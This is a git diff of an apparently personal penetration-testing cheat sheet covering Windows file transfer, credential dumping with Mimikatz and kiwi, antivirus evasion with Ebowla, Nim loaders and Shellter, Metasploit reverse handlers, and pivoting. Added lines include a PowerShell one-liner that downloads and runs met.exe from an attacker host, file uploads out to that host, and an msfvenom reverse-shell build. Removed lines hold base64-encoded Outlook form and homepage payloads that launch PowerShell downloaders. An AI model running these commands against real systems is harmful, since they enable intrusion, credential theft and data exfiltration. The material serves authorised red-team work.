@@ -208,6 +208,40 @@ PS > Invoke-RestMethod -Uri http://127.0.0.1/msg -Method POST -Body $base64str
 
 
 
+### Hex
+
+Compress a binary file and transfer it to Windows by copy-pasting commands into the console:
+
+```
+$ upx -9 file.exe
+$ exe2hex -x file.exe -p file.cmd
+$ cat file.cmd | xclip -i -sel c
+```
+
+
+
+### PowerShell
+
+PowerShell upload file:
+
+```
+PS > (New-Object Net.WebClient).UploadFile("http://10.10.13.37/file.txt", "file.txt")
+```
+
+PowerShell auto detect proxy, download file from remote HTTP server and run it:
+
+```
+$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.UseDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
+```
+
+PowerShell manually set proxy and upload file to remote HTTP server:
+
+```
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential("snovvcrash","Passw0rd!","megacorp.local");$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+```
+
+
+
 
 ## Linux2Linux
 
@@ -314,6 +348,18 @@ Cmd > ftp -v -n -s:ftp.txt
 
 
 
+### TFTP
+
+Send `file.exe` from Windows to Linux (TFTP client must be [enabled](https://teckangaroo.com/enable-tftp-windows-10/) on Windows):
+
+```
+$ sudo atftpd --daemon --bind 10.10.13.37 --port 69 ./tftp
+Cmd > tftp -i 10.10.13.37 put file.exe
+$ sudo pkill atftpd
+```
+
+
+
 
 
 # VNC
@@ -399,12 +445,34 @@ $ smbmap -H 127.0.0.1 -u null -p "" -R
 
 # NFS
 
+
+
+
+## Nmap
+
+Discover rpcbind:
+
 ```
-$ showmount -e 127.0.0.1
-$ mount -t nfs 127.0.0.1:/home /mnt/nfs -v -o user=snovvcrash,[pass='Passw0rd!']
+$ sudo nmap -sV --script=rpcinfo 10.10.10.0/24 -p111
 ```
 
+Run Nmap scripts:
+
+```
+$ sudo nmap --scripts nfs* 10.10.10.0/24 -p111
+```
+
+
+
+
+## Mount
+
 * [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
+
+```
+$ showmount -e 10.10.13.37
+$ sudo mount -v -t nfs -o nolock -o user=snovvcrash,[pass='Passw0rd!'] 10.10.13.37:/home /mnt/nfs
+```
 
 
 
@@ -1677,7 +1745,7 @@ Install:
 ```
 $ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
 $ cd ~/tools/evil-winrm && bundle install && cd -
-$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
+$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm
 Or
 $ gem install evil-winrm
 ```
@@ -1685,7 +1753,8 @@ $ gem install evil-winrm
 Run:
 
 ```
-$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
+$ evil-winrm -u snovvcrash -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -e `pwd`
+$ evil-winrm -u snovvcrash -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s `pwd` -e `pwd`
 ```
 
 
@@ -1771,7 +1840,25 @@ $ grep -P 'Username: ' lsass-pypykatz.minidump -A4 | grep -e Username -e Domain 
 
 
 
-### pypykatz
+### Mimikatz
+
+```
+Cmd > .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+
+#### kiwi
+
+```
+meterpreter > getsystem
+meterpreter > load kiwi
+meterpreter > creds_msv
+meterpreter > creds_all
+```
+
+
+
+### Pypykatz
 
 * [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
 
@@ -2087,7 +2174,7 @@ PS > Bypass-UAC
 
 
 
-# AV Bypass
+# AV Evasion
 
 * [https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/](https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/)
 * [https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/](https://codeby.net/threads/meterpreter-snova-v-dele-100-fud-with-metasploit-5.66730/)
@@ -2095,6 +2182,7 @@ PS > Bypass-UAC
 * [https://hausec.com/2019/02/09/suck-it-windows-defender/](https://hausec.com/2019/02/09/suck-it-windows-defender/)
 * [https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad](https://medium.com/securebit/bypassing-av-through-metasploit-loader-32-bit-6d62930151ad)
 * [https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8](https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8)
+* [https://xakep.ru/2020/12/23/shikata-ga-nai/](https://xakep.ru/2020/12/23/shikata-ga-nai/)
 
 
 
@@ -2117,6 +2205,13 @@ Hyperion + Pescramble
 $ wine hyperion.exe input.exe output.exe
 $ wine PEScrambler.exe -i input.exe -o output.exe
 ```
+
+
+
+
+## Shelter
+
+* [https://www.shellterproject.com/](https://www.shellterproject.com/)
 
 
 
@@ -2148,23 +2243,6 @@ PS > cmd /c C:\Windows\Microsoft.NET\framework\v4.0.30319\msbuild.exe payload.xm
 
 
 
-## Ebowla
-
-```
-$ git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
-$ sudo apt install golang mingw-w64 wine python-dev -y
-$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.13.37 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
-$ vi genetic.config
-...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
-$ python ebowla.py rev.exe genetic.config && rm rev.exe
-$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && rm output/go_symmetric_rev.exe.go
-[+] output/ebowla-rev.exe
-```
-
-
-
-
 ## Invoke-Obfuscation
 
 * [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
@@ -2188,11 +2266,80 @@ PS > Invoke-Expression $dec
 
 
 
-## Tricks
+## Ebowla
+
+```
+$ git clone https://github.com/Genetic-Malware/Ebowla ~/tools/Ebowla && cd ~/tools/Ebowla
+$ sudo apt install golang mingw-w64 wine python-dev -y
+$ sudo python -m pip install configobj pyparsing pycrypto pyinstaller
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.13.37 LPORT=1337 --platform win -f exe -a x64 -o rev.exe
+$ vi genetic.config
+...Edit output_type, payload_type, clean_output, [[ENV_VAR]]...
+$ python ebowla.py rev.exe genetic.config && rm rev.exe
+$ ./build_x64_go.sh output/go_symmetric_rev.exe.go ebowla-rev.exe [--hidden] && rm output/go_symmetric_rev.exe.go
+[+] output/ebowla-rev.exe
+```
 
 
 
-### Windows Defender
+
+## Nim
+
+
+
+### Install
+
+Windows:
+
+* [https://nim-lang.org/install_windows.html](https://nim-lang.org/install_windows.html)
+* [https://git-scm.com/download/win](https://git-scm.com/download/win)
+
+Linux:
+
+```
+$ sudo apt install mingw-w64 -y
+$ curl https://nim-lang.org/choosenim/init.sh -sSf | sh
+```
+
+
+
+### Execute C# Assemblies
+
+* [https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim)
+* [https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/)
+* [https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim)
+
+Dependencies:
+
+```
+Nim > nimble install winim nimcrypto
+```
+
+Compile on Windows:
+
+```
+Cmd > nim c .\encrypt_assembly.nim
+Cmd > nim c .\encrypted_assembly_loader.nim
+```
+
+Compile on Linux:
+
+```
+$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc encrypt_assembly.nim
+$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc encrypted_assembly_loader.nim
+```
+
+Run:
+
+```
+Nim > .\encrypt_assembly.exe Passw0rd! SharpKatz.exe b64.txt
+Nim > .\encrypted_assembly_loader.exe Passw0rd! b64.txt --Command logonpasswords
+```
+
+
+
+
+## Windows Defender
 
 Disable real-time protection (proactive):
 
@@ -2230,6 +2377,86 @@ PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.
 
 
 # Metasploit
+
+* [https://buffered.io/posts/staged-vs-stageless-handlers/](https://buffered.io/posts/staged-vs-stageless-handlers/)
+* [https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/](https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/)
+* [https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation](https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation)
+
+
+
+
+## Cheatsheet
+
+Quick handler launch:
+
+```
+msf > handler -H eth0 -P 443 -p windows/x64/meterpreter/reverse_https [-e x64/xor] [-x]
+```
+
+Bind RC4 handler through SOCKS proxy:
+
+```
+msf > use exploit/multi/handler
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp_rc4
+msf exploit(multi/handler) > set rhosts 127.0.0.1
+msf exploit(multi/handler) > set lport 1337
+msf exploit(multi/handler) > set rc4password Passw0rd!
+msf exploit(multi/handler) > set proxies socks5:127.0.0.1:1080
+msf exploit(multi/handler) > run
+```
+
+Change meterpreter shell transport:
+
+```
+meterpreter > transport add -t reverse_tcp -l 10.10.13.37 -p 9002
+meterpreter > transport list
+msf > handler -H eth0 -P 9002 -p windows/x64/meterpreter/reverse_tcp
+meterpreter > transport next
+```
+
+Automation (about `exploit` options [here](https://github.com/rapid7/metasploit-framework/blob/4049c41ac1b6f12566b055dc5442192072ea5d78/lib/msf/ui/console/command_dispatcher/exploit.rb#L17-L27)):
+
+```
+# auto.rc
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost 10.10.13.37
+set lport 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoRunScript post/windows/manage/migrate
+set ExitOnSession false
+exploit -jz
+```
+
+```
+$ sudo msfconsole -qr auto.rc
+```
+
+Reverse local port `3389` (on Victim, `10.10.13.37`) to local port `43389` (on Attacker):
+
+```
+meterpreter > portfwd add -l 43389 -p 3389 -r 10.10.13.37
+$ xfreerdp /u:administrator /p:'Passw0rd!' /v:127.0.0.1:43389
+```
+
+Routing:
+
+```
+meterpreter > run autoroute -s 192.168.10.0/24
+meterpreter > run autoroute -p
+Or
+msf5 > route add 192.168.10.0/24 1
+msf5 > route
+```
+
+Start SOCKS server (default is SOCKS5):
+
+```
+msf > use auxiliary/server/socks_proxy
+msf auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
+msf auxiliary(server/socks_proxy) > run -j
+```
 
 
 
@@ -2530,6 +2757,7 @@ $ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 # Pivoting
 
 * [PayloadsAllTheThings/Network Pivoting Techniques.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
+* [https://www.programmersought.com/article/93593867459/](https://www.programmersought.com/article/93593867459/)
 
 
 
@@ -2540,10 +2768,10 @@ $ sudo python3 -m pip install git+https://github.com/Tib3rius/AutoRecon.git
 2. [0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel)
 3. [snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)
 
-* Attacker's IP: 10.10.13.37
-* Victims's IP: 192.168.0.20
+* Attacker's IP: `10.10.13.37`
+* Victims's IP: `192.168.0.20`
 
-Reverse local port 1111 (on Victim) to local port 2222 (on Attacker):
+Reverse local port `1111` (on Victim) to local port `2222` (on Attacker):
 
 ```
 $ wget [1/linux]
@@ -2557,7 +2785,7 @@ $ ./chisel server -p 8000 -v --reverse
 
 PS > (new-object net.webclient).downloadfile("http://10.10.13.37/chisel.exe", "$env:userprofile\music\chisel.exe")
 PS > get-filehash -alg md5 chisel.exe
-PS > Start-Process -NoNewWindows chisel.exe client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111
+PS > Start-Process -NoNewWindow chisel.exe client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111
 ```
 
 Socks5 proxy with Chisel in server mode:
@@ -2732,7 +2960,7 @@ PAM MOTD:
 ### Registry & Filesystem
 
 ```
-PS > gc C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+PS > gc $env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 PS > cmd /c where /R C:\ *.ini
 PS > cmd /c 'cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt'
@@ -3544,7 +3772,7 @@ $ sudo apt install openjdk-11-jdk
 # Engagement
 
 ```
-$ cd ~/workspace/
+$ cd ~/ws/  # workspace
 $ mkdir -p discover/{nmap,masscan} enum/bloodhound/bloodhound.py loot/ log/ screenshots/ shells/ tickets/ traffic/
 ```
 
@@ -3799,7 +4027,13 @@ $ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes fr
 $ sort -u -t'.' -k4,4n hosts/pingsweep.txt > hosts/targets.txt && rm hosts/pingsweep.txt
 ```
 
-PowerShell:
+PowerShell (option 1):
+
+```
+PS > echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\sweep.txt};echo "[+] Live hosts:"; Get-Content -Path .\sweep.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\sweep.txt
+```
+
+PowerShell (option 2):
 
 ```
 PS > $NET="192.168.0";for($i=1;$i -lt 255;$i++){$command="ping -n 1 -w 100 $NET.$i > nul 2>&1 && echo $NET.$i";start-process -nonewwindow "cmd" -argumentlist "/c $command" -redirectstandardoutput "tmp$i.txt"};cat tmp*.txt > sweep.txt
@@ -4121,6 +4355,14 @@ PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.
 
 
 ## NetBIOS Scanning
+
+
+
+### nbtscan
+
+```
+$ sudo nbtscan -r 10.10.10.0/24
+```
 
 
 
@@ -4630,33 +4872,12 @@ PS > powershell.exe -exec bypass -c ". .\privesccheck.ps1; Invoke-PrivescCheck -
 ### Seatbelt
 
 * [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
+* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1)
 
 ```
-PS > .\seatbelt.exe -group=all
-PS > IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/invoke-seatbelt.ps1'); Invoke-Seatbelt -Command CredEnum
-```
-
-
-
-
-## One-liners
-
-PowerShell ping sweep:
-
-```
-echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\live_hosts.txt};echo "[+] Live hosts:"; Get-Content -Path .\live_hosts.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\live_hosts.txt
-```
-
-PowerShell auto detect proxy, download file from remote HTTP server and run it:
-
-```
-$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.UseDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
-```
-
-PowerShell manually set proxy and upload file to remote HTTP server:
-
-```
-$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential("snovvcrash","Passw0rd!","megacorp.local");$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+PS > .\Seatbelt.exe CredEnum
+PS > .\Seatbelt.exe ScheduledTasks
+PS > Invoke-Seatbelt -Command "-group=all"
 ```
 
 
@@ -4694,6 +4915,7 @@ PS > [Environment]::Is64BitOperatingSystem
 PS > [Environment]::Is64BitProcess
 PS > $ExecutionContext.SessionState.LanguageMode
 PS > [System.Net.Dns]::GetHostAddresses('hostname') | % {$_.IPAddressToString}
+PS > vssadmin list shadows (or run post/windows/manage/vss_list with MSF)
 ```
 
 Common AV process names:
@@ -4886,82 +5108,6 @@ $ python -m peas --brute-unc -u 'MEGACORP\snovvcrash' -p 'Passw0rd!' mx.megacorp
 
 
 
-### Ruler
-
-* [https://github.com/sensepost/ruler/releases](https://github.com/sensepost/ruler/releases)
-
-
-#### Rules
-
-* [https://github.com/sensepost/ruler/wiki/Rules](https://github.com/sensepost/ruler/wiki/Rules)
-* [https://silentbreaksecurity.com/malicious-outlook-rules/](https://silentbreaksecurity.com/malicious-outlook-rules/)
-
-
-#### Forms
-
-* [https://github.com/sensepost/ruler/wiki/Forms](https://github.com/sensepost/ruler/wiki/Forms)
-* [https://sensepost.com/blog/2017/outlook-forms-and-shells/](https://sensepost.com/blog/2017/outlook-forms-and-shells/)
-
-Display forms:
-
-```
-$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form display
-```
-
-Exploit:
-
-```
-$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form add --suffix test-form --input vbs-payload.txt --send
-```
-
-```(vbs-payload.txt.b64)
-Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikuUnVuICJwb3dlcnNoZWxsIC1leGVjIGJ5cGFzcyAtZW5jIEpBQndBSElBYndCNEFIa0FRUUJrQUdRQWNnQTlBQ2dBUndCbEFIUUFMUUJKQUhRQVpRQnRBRkFBY2dCdkFIQUFaUUJ5QUhRQWVRQWdBQ0lBU0FCTEFFTUFWUUE2QUZ3QVV3QnZBR1lBZEFCM0FHRUFjZ0JsQUZ3QVRRQnBBR01BY2dCdkFITUFid0JtQUhRQVhBQlhBR2tBYmdCa0FHOEFkd0J6QUZ3QVF3QjFBSElBY2dCbEFHNEFkQUJXQUdVQWNnQnpBR2tBYndCdUFGd0FTUUJ1QUhRQVpRQnlBRzRBWlFCMEFDQUFVd0JsQUhRQWRBQnBBRzRBWndCekFDSUFLUUF1QUZBQWNnQnZBSGdBZVFCVEFHVUFjZ0IyQUdVQWNnQTdBQ1FBY0FCeUFHOEFlQUI1QUQwQVRnQmxBSGNBTFFCUEFHSUFhZ0JsQUdNQWRBQWdBRk1BZVFCekFIUUFaUUJ0QUM0QVRnQmxBSFFBTGdCWEFHVUFZZ0JRQUhJQWJ3QjRBSGtBT3dBa0FIQUFjZ0J2QUhnQWVRQXVBRUVBWkFCa0FISUFaUUJ6QUhNQVBRQWtBSEFBY2dCdkFIZ0FlUUJCQUdRQVpBQnlBRHNBSkFCd0FISUFid0I0QUhrQUxnQlZBSE1BWlFCRUFHVUFaZ0JoQUhVQWJBQjBBRU1BY2dCbEFHUUFaUUJ1QUhRQWFRQmhBR3dBY3dBOUFDUUFkQUJ5QUhVQVpRQTdBQ1FBWXdCc0FHa0FaUUJ1QUhRQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVXdCNUFITUFkQUJsQUcwQUxnQk9BR1VBZEFBdUFGY0FaUUJpQUVNQWJBQnBBR1VBYmdCMEFEc0FKQUJqQUd3QWFRQmxBRzRBZEFBdUFGQUFjZ0J2QUhnQWVRQTlBQ1FBY0FCeUFHOEFlQUI1QURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUVRQWJ3QjNBRzRBYkFCdkFHRUFaQUJHQUdrQWJBQmxBQ2dBSWdCb0FIUUFkQUJ3QURvQUx3QXZBREVBTUFBdUFERUFNQUF1QURFQU13QXVBRE1BTndBdkFHZ0FkQUIwQUhBQWN3QTBBRFFBTXdBdUFHVUFlQUJsQUNJQUxBQWlBQ1FBWlFCdUFIWUFPZ0IxQUhNQVpRQnlBSEFBY2dCdkFHWUFhUUJzQUdVQVhBQnRBSFVBY3dCcEFHTUFYQUJvQUhRQWRBQndBSE1BTkFBMEFETUFMZ0JsQUhnQVpRQWlBQ2tBT3dBa0FHVUFlQUJsQUdNQVBRQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBTFFCakFHOEFiUUFnQUhNQWFBQmxBR3dBYkFBdUFHRUFjQUJ3QUd3QWFRQmpBR0VBZEFCcEFHOEFiZ0E3QUNRQVpRQjRBR1VBWXdBdUFITUFhQUJsQUd3QWJBQmxBSGdBWlFCakFIVUFkQUJsQUNnQUlnQWtBR1VBYmdCMkFEb0FkUUJ6QUdVQWNnQndBSElBYndCbUFHa0FiQUJsQUZ3QWJRQjFBSE1BYVFCakFGd0FhQUIwQUhRQWNBQnpBRFFBTkFBekFDNEFaUUI0QUdVQUlnQXBBQW9BIiwgMCwgZmFsc2UK
-```
-
-Cleanup:
-
-```
-$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug form delete --suffix test-form
-```
-
-Empire stager encryption:
-
-```
-$ grep -e output_type -e payload_type -e clean_output -e userdomain genetic.config
-    output_type = GO
-    payload_type = DLL_x64
-    clean_output = True
-        userdomain = 'MEGACORP'
-$ python ebowla.py https443.dll genetic.config
-$ ./build_x64_go.sh output/go_symmetric_https443.dll.go https443.exe --hidden
-```
-
-
-#### Homepage
-
-* [https://github.com/sensepost/ruler/wiki/Homepage](https://github.com/sensepost/ruler/wiki/Homepage)
-* [https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)
-
-Exploit:
-
-```
-$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage add --url http://10.10.13.37/homepage.html
-```
-
-```(homepage.html.b64)
-PGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyI+CjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXdpbmRvd3MtMTI1MiI+Cjx0aXRsZT5PdXRsb29rPC90aXRsZT4KPHNjcmlwdCBpZD1jbGllbnRFdmVudEhhbmRsZXJzVkJTIGxhbmd1YWdlPXZic2NyaXB0Pgo8IS0tCiBTdWIgd2luZG93X29ubG9hZCgpCiAgICAgU2V0IEFwcGxpY2F0aW9uID0gVmlld0N0bDEuT3V0bG9va0FwcGxpY2F0aW9uCiAgICAgU2V0IGNtZCA9IEFwcGxpY2F0aW9uLkNyZWF0ZU9iamVjdCgiV3NjcmlwdC5TaGVsbCIpCiAgICAgY21kLlJ1bigicG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgLWUgSkFCd0FISUFid0I0QUhrQVFRQmtBR1FBY2dBOUFDZ0FSd0JsQUhRQUxRQkpBSFFBWlFCdEFGQUFjZ0J2QUhBQVpRQnlBSFFBZVFBZ0FDSUFTQUJMQUVNQVZRQTZBRndBVXdCdkFHWUFkQUIzQUdFQWNnQmxBRndBVFFCcEFHTUFjZ0J2QUhNQWJ3Qm1BSFFBWEFCWEFHa0FiZ0JrQUc4QWR3QnpBRndBUXdCMUFISUFjZ0JsQUc0QWRBQldBR1VBY2dCekFHa0Fid0J1QUZ3QVNRQnVBSFFBWlFCeUFHNEFaUUIwQUNBQVV3QmxBSFFBZEFCcEFHNEFad0J6QUNJQUtRQXVBRkFBY2dCdkFIZ0FlUUJUQUdVQWNnQjJBR1VBY2dBN0FDUUFjQUJ5QUc4QWVBQjVBRDBBVGdCbEFIY0FMUUJQQUdJQWFnQmxBR01BZEFBZ0FGTUFlUUJ6QUhRQVpRQnRBQzRBVGdCbEFIUUFMZ0JYQUdVQVlnQlFBSElBYndCNEFIa0FPd0FrQUhBQWNnQnZBSGdBZVFBdUFFRUFaQUJrQUhJQVpRQnpBSE1BUFFBa0FIQUFjZ0J2QUhnQWVRQkJBR1FBWkFCeUFEc0FKQUJ3QUhJQWJ3QjRBSGtBTGdCVkFITUFaUUJFQUdVQVpnQmhBSFVBYkFCMEFFTUFjZ0JsQUdRQVpRQnVBSFFBYVFCaEFHd0Fjd0E5QUNRQWRBQnlBSFVBWlFBN0FDUUFZd0JzQUdrQVpRQnVBSFFBUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFVd0I1QUhNQWRBQmxBRzBBTGdCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQURzQUpBQmpBR3dBYVFCbEFHNEFkQUF1QUZBQWNnQnZBSGdBZVFBOUFDUUFjQUJ5QUc4QWVBQjVBRHNBSkFCakFHd0FhUUJsQUc0QWRBQXVBRVFBYndCM0FHNEFiQUJ2QUdFQVpBQkdBR2tBYkFCbEFDZ0FJZ0JvQUhRQWRBQndBRG9BTHdBdkFERUFNQUF1QURFQU1BQXVBREVBTXdBdUFETUFOd0F2QUhNQWRBQmhBR2NBWlFCeUFEWUFOQUF1QUdRQWJBQnNBQ0lBTEFBaUFDUUFaUUJ1QUhZQU9nQjFBSE1BWlFCeUFIQUFjZ0J2QUdZQWFRQnNBR1VBWEFCdEFIVUFjd0JwQUdNQVhBQnpBSFFBWVFCbkFHVUFjZ0EyQURRQUxnQmtBR3dBYkFBaUFDa0FPd0FrQUdVQWVBQmxBR01BUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFMUUJqQUc4QWJRQWdBSE1BYUFCbEFHd0FiQUF1QUdFQWNBQndBR3dBYVFCakFHRUFkQUJwQUc4QWJnQTdBQ1FBWlFCNEFHVUFZd0F1QUhNQWFBQmxBR3dBYkFCbEFIZ0FaUUJqQUhVQWRBQmxBQ2dBSWdCeUFIVUFiZ0JrQUd3QWJBQXpBRElBSWdBc0FDSUFKQUJsQUc0QWRnQTZBSFVBY3dCbEFISUFjQUJ5QUc4QVpnQnBBR3dBWlFCY0FHMEFkUUJ6QUdrQVl3QmNBSE1BZEFCaEFHY0FaUUJ5QURZQU5BQXVBR1FBYkFCc0FDSUFLUUFLQUE9PSIpCiBFbmQgU3ViCi0tPgoKPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgogPG9iamVjdCBjbGFzc2lkPSJjbHNpZDowMDA2RjA2My0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDYiIGlkPSJWaWV3Q3RsMSIgZGF0YT0iIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj48L29iamVjdD4KPC9ib2R5Pgo8L2h0bWw+Cg==
-```
-
-Cleanup:
-
-```
-$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage delete
-```
-
-Stager encryption is the same as for Ruler/Forms.
-
-
-
 ### CVE-2020-0688
 
 * [https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys](https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
@@ -5089,6 +5235,87 @@ PS > Invoke-DomainHarvestOWA -ExchHostname mx.megacorp.com
 ```
 $ python get_ad_domain.zip -m owa mx.megacorp.com
 ```
+
+
+
+
+## Outlook
+
+
+
+### Ruler
+
+* [https://github.com/sensepost/ruler/releases](https://github.com/sensepost/ruler/releases)
+
+
